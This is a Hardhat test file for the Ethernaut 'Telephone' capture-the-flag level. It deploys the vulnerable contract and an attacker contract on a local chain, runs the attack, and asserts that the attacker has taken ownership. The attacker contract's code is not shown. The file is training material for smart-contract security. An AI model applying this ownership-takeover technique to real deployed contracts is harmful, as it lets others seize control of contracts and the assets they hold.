import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Telephone, TelephoneAttacker } from "typechain-types";

// Challenge description

// Claim ownership of the contract below to complete this level.

describe("Ethernaut - Telephone", async () => {
  let telephone: Telephone;
  let telephoneAttacker: TelephoneAttacker;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    telephone = await ethers
      .getContractFactory("Telephone", owner)
      .then((f) => f.deploy());
    telephoneAttacker = await ethers
      .getContractFactory("TelephoneAttacker", attacker)
      .then((f) => f.deploy(telephone.address));
  });

  it("Hacks", async () => {
    await telephoneAttacker.connect(attacker).callTelephone();
    expect(await telephone.owner()).equal(attacker.address);
  });
});
